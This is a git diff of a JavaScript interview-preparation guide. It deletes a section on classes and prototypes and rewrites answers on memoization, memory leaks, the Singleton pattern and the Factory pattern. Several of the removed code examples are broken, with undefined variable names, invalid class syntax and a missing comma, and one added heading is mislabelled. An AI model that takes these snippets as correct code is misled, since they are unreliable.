+// Hash — triggers hashchange event, no server request
+location.hash = 'section-2';
+
+// Query string via pushState
+history.pushState(null, '', '?tab=profile');
+
+// Or with URLSearchParams
+const params = new URLSearchParams(location.search);
+params.set('tab', 'profile');
+history.pushState(null, '', `?${params}`);
 ```
 
 <div align="right">
@@ -12817,602 +13205,6 @@ observer.observe(sentinel);
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
 
-# # 13. CLASSES
-
-<br>
-
-## Q. Explain how prototypal inheritance works?
-
-The Prototypal Inheritance is a feature in javascript used to add methods and properties in objects. It is a method by which an object can inherit the properties and methods of another object.
-
-In order to get and set the [[Prototype]] of an object, we use `Object.getPrototypeOf()` and `Object.setPrototypeOf()`. Nowadays, in modern language, it is being set using `__proto__`.
-
-**Syntax:**
-
-```js
-ChildObject.__proto__ = ParentObject
-```
-
-**Example:**
-
-In the given example, there are two objects **ParentUser** and **ChildUser**. The object ChildUser inherits the methods and properties of the object ParentUser and further uses them.
-
-```js
-// Parent Object
-let ParentUser = {
-  talk: true,
-  Canfly() {
-    return "Sorry, Can\'t fly";
-  },
-};
-
-// Child Object
-let ChildUser = {
-  CanCode: true,
-  CanCook() {
-    return "Can\'t say";
-  },
-
-  //  Inheriting the properties and methods of Parent Object
-  __proto__: ParentUser,
-};
-
-// Property of Parent Object
-console.log("Can a User talk?: " + ChildUser.talk);
-
-// Method of ParentUser
-console.log("Can a User fly?: " + ChildUser.Canfly());
-
-// Property of ChildUser
-console.log("Can a User code?: " + ChildUser.CanCode);
-
-// Method of ChildUser
-console.log("Can a User cook?: " + ChildUser.CanCook());
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototypal-inheritance-qxp33h?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is the difference between prototype and __proto__ in JavaScript?
-
-**1. Proto**: 
-
-It is an actual object that provides a way inherit to inherit properties from JavaScript with the help of an object which is created with new. Every object with behavior associated has internal property [[prototype]].
-
-**Syntax:**
-
-```js
-Object.__proto__ = value
-```
-
-**Example:**
-
-```js
-function Employee(id, name) {
-  this.id = id;
-  this.name = name;
-}
-const employee = new Employee(1090, "Sarvesh Ghose");
-
-// Object have proto property
-employee
-
-// Also if apply strict equal to check
-// if both point at the same
-// location then it will return true.
-Employee.prototype === employee._proto_ // false
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-proto-sqkxeb?file=/src/index.js)**
-
-**2. Prototype**: 
-
-It is a special object which means it holds shared attributes and behaviors of instances. It is a way to inherit properties from javascript as it is available in every function declaration.
-
-**Syntax:**
-
-```js
-objectTypeName.prototype.SharedPropertyName = value;
-```
-
-**Example:**
-
-```js
-// Constructor function
-function Employee(id, name) {
-  this.id = id;
-  this.name = name;
-}
-
-// Objects
-const employee = new Employee(3325, "Karishma Som");
-
-// Prototype
-Employee.prototype.getName = function () {
-  return this.name;
-};
-
-// Function call using object
-console.log(employee.getName());
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototype-wvh93l?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What are the differences between ES6 class and ES5 function constructors?
-
-Classes are a template for creating objects. They encapsulate data with code to work on that data. Classes in JS are built on prototypes but also have some syntax and semantics that are not shared with ES5 class-like semantics. 
-
-ES6 Classes formalize the common JavaScript pattern of simulating class-like inheritance hierarchies using functions and prototypes. They are effectively simple sugaring over prototype-based OO, offering a convenient declarative form for class patterns which encourage interoperability.
-
-ES6 Class Properties
-
-* Class keyword
-* getter/setter method
-* constructor function
-* extends keyword
-* super keyword
-* static keyword
-
-**Example:** ES5 Function Constructor
-
-```js
-// ES5 Function Constructor
-function Student(name, studentId) {
-  // Call constructor of superclass to initialize superclass-derived members.
-  Person.call(this, name);
-
-  // Initialize subclass\'s own members.
-  this.studentId = studentId;
-}
-
-Student.prototype = Object.create(Person.prototype);
-Student.prototype.constructor = Student;
-```
-
-**Example:** ES6 Class
-
-```js
-// ES6 Class
-class Student extends Person {
-  constructor(name, studentId) {
-    super(name);
-    this.studentId = studentId;
-  }
-}
-```
-
-It\'s much more verbose to use inheritance in ES5 and the ES6 version is easier to understand and remember.
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is class expression in es6 class?
-
-A class expression is another way to define a class. Class expressions can be named or unnamed. The name given to a named class expression is local to the class\'s body. However, it can be accessed via the name property.
-
-**Example:**
-
-```js
-// Unnamed Class
-let Rectangle = class {
-  constructor(height, width) {
-    this.height = height;
-    this.width = width;
-  }
-};
-console.log(Rectangle.name); // Rectangle
-
-// Named Class
-let Triangle = class TriangleClass {
-  constructor(base, height) {
-    this.base = base;
-    this.height = height;
-  }
-};
-console.log(Triangle.name); // TriangleClass
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-class-expression-nqbyr2?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is difference between private, public and static variables?
-
-Private variables can be accessed by all the members (functions and variables) of the owner object but not by any other object. Public variables can be accessed by all the members of the owner as well as other objects that can access the owner.
-Static variables are related to a class. They come into existence as soon as a class come into existence.
-
-**Example:**
-
-```js
-// Constructor Function
-function MyClass () {
- 
-  var privateVariable = "I am private!";  // Private variable 
-  this.publicVariable = "I am public!";  // Public variable 
-
-  this.publicMethod = function () {  // Public Method
-    return privateVariable;
-  };
-}
-
-// Instance method will be available to all instances but only load once in memory 
-MyClass.prototype.publicMethod = function () {    
-  return this.publicVariable;
-};
-
-// Static variable shared by all instances
-MyClass.staticProperty = "I am static!";
-
-var myInstance = new MyClass();
-
-console.log(myClass.publicMethod()); // I am private! 
-console.log(MyClass.staticProperty); // I am static! 
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-variable-scope-rgjsm4?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is difference between Classic Inheritance and Prototypical Inheritance?
-
-**1. Class Inheritance**: 
-
-Instances inherit from classes (like a blueprint — a description of the class), and create sub-class relationships: hierarchical class taxonomies. Instances are typically instantiated via constructor functions with the new keyword. Class inheritance may or may not use the class keyword from ES6.
-
-**2. Prototypal Inheritance**: 
-
-Instances inherit directly from other objects. Instances are typically instantiated via factory functions or Object.create(). Instances may be composed from many different objects, allowing for easy selective inheritance.
-
-**Features**  
-
-* Classes: create tight coupling or hierarchies/taxonomies.
-* Prototypes: mentions of concatenative inheritance, prototype delegation, functional inheritance, object composition.
-* No preference for prototypal inheritance & composition over class inheritance.
-
-The difference between classical inheritance and prototypal inheritance is that classical inheritance is limited to classes inheriting from other classes while prototypal inheritance supports the cloning of any object using an object linking mechanism. A prototype basically acts as a template for other objects, whether they are extending the base object or not.
-
-**Example:**
-
-```js
-function Circle(radius) {
-  this.radius = radius;
-}
-
-Circle.prototype.area = function () {
-  let radius = this.radius;
-  return Math.PI * radius * radius;
-};
-
-Circle.prototype.circumference = function () {
-  return 2 * Math.PI * this.radius;
-};
-
-const circle = new Circle(5);
-
-console.log(circle.area()); // 78.53981633974483
-console.log(circle.circumference()); // 31.41592653589793
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototypical-inheritance-iyxh6u?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. How do you create an object with prototype?
-
-The `Object.create()` method is used to create a new object with the specified prototype object and properties. i.e, It uses existing object as the prototype of the newly created object. It returns a new object with the specified prototype object and properties.
-
-**Example:**
-
-```js
-const user = {
-  name: "Jayesh Sahni",
-  printInfo: function () {
-    console.log(`My name is ${this.name}.`);
-  }
-};
-
-const admin = Object.create(user);
-admin.name = "Disha Choudhry"; // Here, "name" is a property set on "admin" but not on "user" object
-admin.printInfo(); // My name is Disha Choudhry
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-object-create-skyznx?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. How to use constructor functions for inheritance in JavaScript?
-
-Let say we have `Person` class which has name, age, salary properties and **incrementSalary()** method.
-
-```js
-// Functions Constructor
-function Person(name, age, salary) {
-  this.name = name;
-  this.age = age;
-  this.salary = salary;
-  this.incrementSalary = function (byValue) {
-    this.salary = this.salary + byValue;
-  };
-}
-```
-
-Now we wish to create Employee class which contains all the properties of Person class and wanted to add some additional properties into Employee class.
-
-```js
-function Employee(company){
-	this.company = company;
-}
-
-// Prototypal Inheritance 
-Employee.prototype = new Person("Sundar Pichai", 24, 5000);
-```
-
-In the example above, **Employee** type inherits from **Person**. It does so by assigning a new instance of `Person` to `Employee` prototype. After that, every instance of `Employee` inherits its properties and methods from `Person`.
-
-```js
-// Prototypal Inheritance 
-Employee.prototype = new Person("Sundar Pichai", 24, 5000);
-
-var employee = new Employee("Google");
-
-console.log(employee instanceof Person); // true
-console.log(employee instanceof Employee); // true
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototypal-inheritance-djtiuh?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is prototype chain?
-
-**Prototype chaining** is used to build new types of objects based on existing ones. It is similar to inheritance in a class based language. The prototype on object instance is available through `Object.getPrototypeOf(object)` or `__proto__` property whereas prototype on constructors function is available through **Object.prototype**.
-
-**Example:**
-
-```js
-function Person(firstName, lastName, age) {
-  this.firstName = firstName;
-  this.lastName = lastName;
-  this.age = age;
-}
-// Prototype chaining
-Person.prototype.getFullName = function () {
-  return this.firstName + " " + this.lastName;
-};
-
-// create an instance of the Person class
-const person = new Person("Vanya", "Dayal", 25);
-
-person.hasOwnProperty("firstName"); // true
-person.hasOwnProperty("getFullName"); // false
-person.getFullName(); // Vanya Dayal
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototype-chaining-9fvow6?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What are javascript accessors?
-
-ECMAScript 5 introduced javascript object accessors or computed properties through getters and setters. Getters uses `get` keyword whereas Setters uses `set` keyword.
-
-```js
-var user = {
-  firstName: "John",
-  lastName : "Abraham",
-  language : "en",
-  get lang() {
-    return this.language;
-  }
-  set lang(lang) {
-  this.language = lang;
-  }
-};
-
-console.log(user.lang); // getter access lang as en
-user.lang = 'fr';
-console.log(user.lang); // setter used to set lang as fr
-```
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. How do you define property on Object constructor?
-
-The Object.defineProperty() static method is used to define a new property directly on an object, or modifies an existing property on an object, and returns the object. 
-
-```js
-const newObject = {};
-
-Object.defineProperty(newObject, 'newProperty', {
-  value: 100,
-  writable: false
-});
-
-console.log(newObject.newProperty); // 100
-
-newObject.newProperty = 200; // It throws an error in strict mode due to writable setting
-```
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is the difference between get and defineProperty?
-
-Both has similar results until unless you use classes. If you use `get` the property will be defined on the prototype of the object whereas using `Object.defineProperty()` the property will be defined on the instance it is applied to.
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What are the advantages of Getters and Setters?
-
-Below are the list of benefits of Getters and Setters,
-
-* They provide simpler syntax
-* They are used for defining computed properties, or accessors in JS.
-* Useful to provide equivalence relation between properties and methods
-* They can provide better data quality
-* Useful for doing things behind the scenes with the encapsulated logic.
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. Can I add getters and setters using defineProperty method?
-
-Yes, You can use `Object.defineProperty()` method to add Getters and Setters. For example, the below counter object uses increment, decrement, add and substract properties,
-
-```js
-var counterObj = {counter : 0};
-
-// Define getters
-Object.defineProperty(obj, "increment", {
-  get : function () {this.counter++;}
-});
-Object.defineProperty(obj, "decrement", {
-  get : function () {this.counter--;}
-});
-
-// Define setters
-Object.defineProperty(obj, "add", {
-  set : function (value) {this.counter += value;}
-});
-Object.defineProperty(obj, "subtract", {
-  set : function (value) {this.counter -= value;}
-});
-
-obj.add = 10;
-obj.subtract = 5;
-console.log(obj.increment); //6
-console.log(obj.decrement); //5
-```
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What is a decorator?
-
-A decorator is an expression that evaluates to a function and that takes the target, name, and decorator descriptor as arguments. Also, it optionally returns a decorator descriptor to install on the target object. 
-
-Let us define admin decorator for user class at design time,
-
-```js
-function admin(isAdmin) {
-  return function(target) {
-      target.isAdmin = isAdmin;
-  }
-}
-
-@admin(true)
-class User() {
-}
-console.log(User.isAdmin); // true
-
-@admin(false)
-class User() {
-}
-console.log(User.isAdmin); // false
-```
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
-## Q. What are private class fields in JavaScript?
-
-Private class fields (ES2022) use the `#` prefix to declare fields that are only accessible from inside the class body. They are a true hard private — not accessible via `obj['#field']` or any workaround.
-
-**Syntax:**
-
-```js
-class ClassName {
-  #privateField = defaultValue;
-  #privateMethod() { ... }
-}
-```
-
-**Example:**
-
-```js
-class BankAccount {
-  #balance;
-  #owner;
-
-  constructor(owner, initialBalance) {
-    this.#owner = owner;
-    this.#balance = initialBalance;
-  }
-
-  deposit(amount) {
-    if (amount > 0) this.#balance += amount;
-  }
-
-  withdraw(amount) {
-    if (amount <= this.#balance) this.#balance -= amount;
-    else throw new Error('Insufficient funds');
-  }
-
-  get info() {
-    return `${this.#owner}: \$${this.#balance}`;
-  }
-}
-
-const acc = new BankAccount('Alice', 1000);
-acc.deposit(500);
-console.log(acc.info); // 'Alice: $1500'
-
-// Private fields are inaccessible outside the class:
-console.log(acc.#balance); // SyntaxError
-```
-
-**Private static fields and methods** are also supported:
-
-```js
-class Counter {
-  static #count = 0;
-
-  constructor() {
-    Counter.#count++;
-  }
-
-  static getCount() {
-    return Counter.#count;
-  }
-}
-
-new Counter();
-new Counter();
-console.log(Counter.getCount()); // 2
-```
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
 ## ## L4: Expert (Senior / Architect)
 
 <br>
@@ -13426,188 +13218,52 @@ console.log(Counter.getCount()); // 2
 **Memoization** is a caching technique that stores the return value of a pure function keyed by its arguments. On subsequent calls with the same arguments, the cached result is returned without re-executing the function. It is the programmatic application of the mathematical concept that pure functions are referentially transparent (same input → same output).
 
 **Production concerns beyond the naïve implementation:**
+
 1. **Cache key strategy** — `JSON.stringify` fails for non-serialisable args (functions, circular refs, Symbols, `undefined`). A WeakMap keyed on object identity avoids this.
 2. **Cache eviction** — unbounded caches grow without limit. LRU (Least Recently Used) eviction is standard.
 3. **Async memoization** — memoize the Promise itself, not the resolved value, to prevent duplicate in-flight requests.
 4. **TTL (Time To Live)** — stale cached values must expire for data that changes over time.
 
+**Example:**
+
 ```js
-// ── Basic memoize (serialisable args only) ────────────────────────────────────
-function memoize(fn) {
+/**
+ * Production-grade Memoization Helper with an LRU Cache Policy
+ */
+function memoize(fn, options = {}) {
+  const { 
+    maxSize = 1000, 
+    keyResolver = (...args) => JSON.stringify(args) 
+  } = options;
+
+  // Map maintains insertion order, making it perfect for LRU eviction
   const cache = new Map();
-  return function (...args) {
-    const key = JSON.stringify(args);
-    if (cache.has(key)) return cache.get(key);
-    const result = fn.apply(this, args);
-    cache.set(key, result);
-    return result;
-  };
-}
-
-const fib = memoize(function (n) {
-  if (n <= 1) return n;
-  return fib(n - 1) + fib(n - 2);
-});
-
-console.log(fib(40)); // computed once; subsequent calls O(1)
-
-// ── LRU cache memoization ─────────────────────────────────────────────────────
-function memoizeLRU(fn, maxSize = 100) {
-  const cache = new Map(); // Map preserves insertion order
 
   return function (...args) {
-    const key = JSON.stringify(args);
+    const key = keyResolver(...args);
 
     if (cache.has(key)) {
-      // Move to end (most recently used)
+      // Refresh key order for LRU policy by moving it to the end
       const value = cache.get(key);
       cache.delete(key);
       cache.set(key, value);
       return value;
     }
 
+    // Compute the expensive result
     const result = fn.apply(this, args);
 
+    // Evict the oldest item if the cache limit is reached
     if (cache.size >= maxSize) {
-      // Evict least recently used (first inserted key)
-      cache.delete(cache.keys().next().value);
+      const oldestKey = cache.keys().next().value;
+      cache.delete(oldestKey);
     }
 
     cache.set(key, result);
     return result;
   };
 }
-
-// ── Async memoization — memoize the Promise, not the value ───────────────────
-function memoizeAsync(fn, ttlMs = 60_000) {
-  const cache = new Map();
-
-  return async function (...args) {
-    const key = JSON.stringify(args);
-    const cached = cache.get(key);
-
-    if (cached && Date.now() < cached.expiresAt) {
-      return cached.promise; // return same Promise for concurrent calls
-    }
-
-    const promise = fn.apply(this, args).catch(err => {
-      cache.delete(key); // evict on failure so next call retries
-      return Promise.reject(err);
-    });
-
-    cache.set(key, { promise, expiresAt: Date.now() + ttlMs });
-    return promise;
-  };
-}
-
-const fetchUser = memoizeAsync(async (id) => {
-  const res = await fetch(`/api/users/${id}`);
-  return res.json();
-}, 30_000); // cached for 30 seconds
-
-// Concurrent calls with same id — only ONE network request fires
-const [u1, u2] = await Promise.all([fetchUser(42), fetchUser(42)]);
 ```
-
-**Real-World Use Case:**
-
-React\'s `useMemo` and `useCallback` are single-entry memoization (cache size = 1, keyed by the dependency array). For expensive selector computations in Redux stores, `reselect`\'s `createSelector` uses memoization with structural equality checks — preventing re-computation of derived state (e.g., filtering 10,000 product records) on every render when the input state has not changed. At scale (Shopify Admin, GitHub\'s repo page), this reduces CPU time from O(n) on every render to O(1) on cache hits.
-
----
-
-## Q. What is the difference between debouncing and throttling, and when should you apply each?
-
-Both techniques limit how frequently a function executes in response to rapidly-firing events, but they differ in their guarantee:
-
-| | **Debounce** | **Throttle** |
-|---|---|---|
-| Guarantee | Executes once **after** a quiet period | Executes **at most once** per interval |
-| Fires when | Event **stops** firing for `delay` ms | **First** call, then once per `delay` ms |
-| Best for | Search-as-you-type, resize-end handler | Scroll position, mouse-move, rate-limiting API calls |
-| Mental model | "Wait until they stop" | "Execute at a steady pace" |
-
-```js
-// ── Debounce ──────────────────────────────────────────────────────────────────
-function debounce(fn, delay) {
-  let timerId;
-
-  return function (...args) {
-    clearTimeout(timerId);
-    timerId = setTimeout(() => {
-      fn.apply(this, args);
-    }, delay);
-  };
-}
-
-// ── Debounce with leading edge (fire immediately, then silence) ───────────────
-function debounceLeading(fn, delay) {
-  let timerId;
-  let leading = true;
-
-  return function (...args) {
-    if (leading) {
-      fn.apply(this, args);
-      leading = false;
-    }
-    clearTimeout(timerId);
-    timerId = setTimeout(() => {
-      leading = true;
-    }, delay);
-  };
-}
-
-// ── Throttle ──────────────────────────────────────────────────────────────────
-function throttle(fn, interval) {
-  let lastCall = 0;
-
-  return function (...args) {
-    const now = Date.now();
-    if (now - lastCall >= interval) {
-      lastCall = now;
-      return fn.apply(this, args);
-    }
-  };
-}
-
-// ── Throttle with rAF (frame-rate-limited — best for visual updates) ──────────
-function throttleRAF(fn) {
-  let rafId = null;
-
-  return function (...args) {
-    if (rafId) return; // skip if already queued
-    rafId = requestAnimationFrame(() => {
-      fn.apply(this, args);
-      rafId = null;
-    });
-  };
-}
-
-// ── Usage examples ────────────────────────────────────────────────────────────
-
-// Search input: fire only after user pauses typing for 300ms
-const searchInput = document.querySelector('#search');
-const handleSearch = debounce(async (query) => {
-  const results = await fetch(`/api/search?q=${encodeURIComponent(query)}`).then(r => r.json());
-  renderResults(results);
-}, 300);
-searchInput.addEventListener('input', e => handleSearch(e.target.value));
-
-// Scroll handler: update progress bar at most every 16ms (~60fps)
-const updateProgress = throttleRAF(() => {
-  const scrollPct = (window.scrollY / document.body.scrollHeight) * 100;
-  document.querySelector('#progress').style.width = `${scrollPct}%`;
-});
-window.addEventListener('scroll', updateProgress, { passive: true });
-
-// API rate limit: max one analytics event per 2 seconds
-const trackEvent = throttle((eventName, data) => {
-  navigator.sendBeacon('/analytics', JSON.stringify({ eventName, data }));
-}, 2_000);
-```
-
-**Real-World Use Case:**
-
-Google Docs debounces its autosave — it waits 1–2 seconds after the last keystroke before persisting to the server, balancing data safety against API call frequency. GitHub\'s code search uses debounce on the search field to avoid firing API requests on every character. Twitter\'s (now X) infinite scroll uses throttle on the `scroll` event to check whether new tweets should be loaded, executing the check at most once per 200ms. Without these optimisations, a fast typist or a smooth-scrolling device would generate hundreds of redundant API calls or DOM operations per second.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -13615,7 +13271,9 @@ Google Docs debounces its autosave — it waits 1–2 seconds after the last key
 
 ## Q. What are the common causes of JavaScript memory leaks, and how do you detect and fix them?
 
-A memory leak occurs when objects are allocated but never released because the garbage collector cannot determine they are unreachable — typically because an unintended reference holds them alive. The V8 GC uses a **mark-and-sweep** algorithm: it marks all objects reachable from GC roots (global, stack, closures) and sweeps everything else. A leak means an object is always reachable even when the application has logically finished with it.
+A memory leak in JavaScript occurs when pieces of memory that the application no longer needs are **not released** back to the operating system. This happens because the JavaScript Garbage Collector (`GC`) cannot reclaim memory if a piece of data is still reachable via references starting from the global root object (`window` or `globalThis`). 
+
+The V8 GC uses a **mark-and-sweep** algorithm: it marks all objects reachable from GC roots (global, stack, closures) and sweeps everything else. A leak means an object is always reachable even when the application has logically finished with it.
 
 **The six most common leak patterns:**
 
@@ -13628,8 +13286,13 @@ A memory leak occurs when objects are allocated but never released because the g
 | `setInterval` not cleared | Callback runs forever after component unmount | `clearInterval` on cleanup |
 | Promises never settling | Pending Promises hold closures alive | Add timeouts; cancel with `AbortController` |
 
+**Example 01:** Forgotten event listener
+
 ```js
-// ── Pattern 1: Forgotten event listener ───────────────────────────────────────
+/**
+ * Pattern 1: Forgotten event listener 
+ */
+
 class VideoPlayer {
   constructor(videoEl) {
     this.video = videoEl;
@@ -13640,46 +13303,74 @@ class VideoPlayer {
   #onProgress() { /* update UI */ }
 
   destroy() {
-    this.video.removeEventListener('timeupdate', this.handleProgress); // ✅ cleanup
+    this.video.removeEventListener('timeupdate', this.handleProgress); //  cleanup
     this.video = null;
   }
 }
+```
 
-// ── Pattern 2: Detached DOM nodes ─────────────────────────────────────────────
-// ❌ Leak: removed from DOM but still referenced
+**Example 02:** Detached DOM nodes 
+
+```js
+/**
+ * Pattern 2: Detached DOM nodes 
+ */
+
+//  Leak: removed from DOM but still referenced
 const cache = new Map();
 function addToCache(el) {
   cache.set(el.id, el); // holds el alive even after el is removed from DOM
 }
 
-// ✅ Fix: use WeakMap — GC can collect el when DOM reference drops
+//  Fix: use WeakMap — GC can collect el when DOM reference drops
 const weakCache = new WeakMap();
 function addToWeakCache(el) {
   weakCache.set(el, { processedAt: Date.now() });
 }
+```
 
-// ── Pattern 3: Growing closure scope ──────────────────────────────────────────
-// ❌ Leak: entire apiResponse (potentially MB) kept alive by small closure
+**Example 03:** Detached DOM nodes 
+
+```js
+/**
+ * Pattern 3: Growing closure scope 
+ */
+
+//  Leak: entire apiResponse (potentially MB) kept alive by small closure
 function processResponse(apiResponse) {
   const { users } = apiResponse; // apiResponse still referenced by the closure below
   return function getFirstUser() { return apiResponse.users[0]; }; // closes over apiResponse
 }
 
-// ✅ Fix: close over only what you need
+//  Fix: close over only what you need
 function processResponseFixed(apiResponse) {
   const firstUser = apiResponse.users[0]; // extract immediately
   apiResponse = null;                      // hint to GC (not strictly necessary but expressive)
   return function getFirstUser() { return firstUser; };
 }
+```
 
-// ── Pattern 4: setInterval leak ───────────────────────────────────────────────
+**Example 04:** setInterval leak  
+
+```js
+/**
+ * Pattern 4: setInterval leak 
+ */
+
 // React useEffect with cleanup
 useEffect(() => {
   const id = setInterval(() => fetchMetrics().then(setMetrics), 5_000);
-  return () => clearInterval(id); // ✅ cleared on unmount
+  return () => clearInterval(id); //  cleared on unmount
 }, []);
+```
 
-// ── Pattern 5: AbortController for pending fetches ───────────────────────────
+**Example 05:** AbortController for pending fetches  
+
+```js
+/**
+ * Pattern 5: AbortController for pending fetches 
+ */
+
 useEffect(() => {
   const controller = new AbortController();
 
@@ -13688,18 +13379,15 @@ useEffect(() => {
     .then(setData)
     .catch(err => { if (err.name !== 'AbortError') console.error(err); });
 
-  return () => controller.abort(); // ✅ cancels in-flight request on unmount
+  return () => controller.abort(); //  cancels in-flight request on unmount
 }, []);
 ```
 
 **Detection with Chrome DevTools:**
+
 1. **Memory** tab → take Heap Snapshot before and after a user action → filter by "Objects allocated between snapshots".
 2. **Performance** tab → record a session → look for steadily growing JS Heap in the memory track.
 3. `node --expose-gc` in Node.js + `global.gc()` + `process.memoryUsage()` for automated leak detection in CI.
-
-**Real-World Use Case:**
-
-A production trading dashboard (live price updates via WebSocket) was leaking ~5 MB/minute because chart components registered `message` event listeners on the WebSocket instance but the cleanup function never deregistered them. After navigating away and back (SPA route change), each visit added another listener. After 20 minutes, the page consumed 100 MB extra and began janking at 15 fps. Adding `ws.removeEventListener('message', handler)` in the React `useEffect` cleanup eliminated the leak entirely — a pattern enforced by the team\'s custom ESLint rule that requires every `addEventListener` to be paired with a `removeEventListener`.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -13713,81 +13401,74 @@ A production trading dashboard (live price updates via WebSocket) was leaking ~5
 
 The **Singleton** pattern ensures a class has **only one instance** and provides a global access point to it. In JavaScript it is commonly implemented via module-level variables (ES modules are singletons by default) or static class fields.
 
+**1. Module-Level Singleton (Recommended)**
+
+JavaScript modules are cached automatically after the first time they are imported. This makes exporting an instance directly the cleanest and most idiomatic approach
+
+**Example:**
+
+```js
+/**
+ * Module-Level Singleton
+ */
+
+// dbConnection.js
+class DatabaseConnection {
+  constructor() {
+    this.connectionString = "mongodb://localhost:27017/prod";
+  }
+
+  query(sql) {
+    console.log(`Executing: ${sql}`);
+  }
+}
+
+// Instantiate and freeze the instance to prevent modifications
+const instance = new DatabaseConnection();
+Object.freeze(instance);
+
+export default instance;
+```
+
+**2. Class-Enforced Singleton**
+
+If you must restrict developers from using the `new` keyword to create multiple instances, enforce it directly inside the `constructor`.
+
+**Example:**
+
+```js
+/**
+ * Class-Enforced Singleton
+ */
+
+class ConfigManager {
+  static #instance = null;
+
+  constructor() {
+    // Prevent direct instantiation if an instance already exists
+    if (ConfigManager.#instance) {
+      return ConfigManager.#instance;
+    }
+
+    this.settings = { theme: "dark" };
+    ConfigManager.#instance = this;
+    Object.freeze(this);
+  }
+
+  static getInstance() {
+    if (!ConfigManager.#instance) {
+      new ConfigManager(); // Triggers constructor allocation
+    }
+    return ConfigManager.#instance;
+  }
+}
+
+export default ConfigManager;
+```
+
 **When appropriate:** database connection pools, configuration registries, application-wide event buses, loggers, feature flag services — resources that are expensive to initialise or must be shared state.
 
 **When it is an anti-pattern:** when the singleton makes code hard to test (tight coupling), when it hides dependencies (dependency injection is preferable), or when it holds mutable global state that causes subtle bugs in concurrent/multi-tenant environments.
-
-```js
-// ── ES Module Singleton (simplest — modules are cached after first import) ────
-// config.js
-const _config = Object.freeze({
-  apiUrl: process.env.API_URL ?? 'http://localhost:3000',
-  timeout: 5_000,
-});
-export default _config; // every importer gets the same frozen object
-
-// ── Class-based Singleton with lazy initialisation ────────────────────────────
-class DatabasePool {
-  static #instance = null;
-  #connections     = [];
-  #maxSize;
-
-  constructor(maxSize = 10) {
-    if (DatabasePool.#instance) {
-      throw new Error('Use DatabasePool.getInstance() — do not call new directly');
-    }
-    this.#maxSize = maxSize;
-    this.#connections = Array.from({ length: maxSize }, (_, i) => ({
-      id: i, inUse: false
-    }));
-  }
-
-  static getInstance(maxSize) {
-    DatabasePool.#instance ??= new DatabasePool(maxSize);
-    return DatabasePool.#instance;
-  }
-
-  acquire() {
-    const conn = this.#connections.find(c => !c.inUse);
-    if (!conn) throw new Error('No available connections');
-    conn.inUse = true;
-    return conn;
-  }
-
-  release(conn) {
-    conn.inUse = false;
-  }
-
-  // Reset for testing only — never call in production
-  static _resetForTesting() {
-    DatabasePool.#instance = null;
-  }
-}
-
-const pool1 = DatabasePool.getInstance(5);
-const pool2 = DatabasePool.getInstance();
-console.log(pool1 === pool2); // true — same instance
-
-// ── Testing challenge & mitigation via DI ─────────────────────────────────────
-// Instead of: class OrderService { constructor() { this.db = DatabasePool.getInstance(); } }
-// Prefer:
-class OrderService {
-  constructor(dbPool = DatabasePool.getInstance()) { // injectable default
-    this.db = dbPool;
-  }
-  async createOrder(data) {
-    const conn = this.db.acquire();
-    try { /* use conn */ }
-    finally { this.db.release(conn); }
-  }
-}
-
-// In tests: const svc = new OrderService(mockPool); — no singleton dependency
-```
-
-**Real-World Use Case:**
-
-Node.js\'s `require()` caches modules — every `require('./db')` returns the same module export, making the export a de-facto singleton. Mongoose uses this: the default `mongoose` instance is a module-level singleton that holds the active connection. When multiple files `require('mongoose')`, they all share one connection pool — intentional singleton behaviour. In contrast, NestJS encourages explicit dependency injection over singletons, making services testable with mock providers injected by the IoC container.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -13795,85 +13476,125 @@ Node.js\'s `require()` caches modules — every `require('./db')` returns the sa
 
 ## Q. Implement the Factory and Abstract Factory patterns — how do they enable Open/Closed architecture?
 
-The **Factory pattern** delegates object creation to a function or method, decoupling the caller from concrete implementations. The caller specifies *what* it wants; the factory decides *how* to create it. This satisfies the **Open/Closed Principle** (open for extension, closed for modification) — adding a new product type requires only registering a new creator, not modifying existing code.
+**1. Factory Pattern**
 
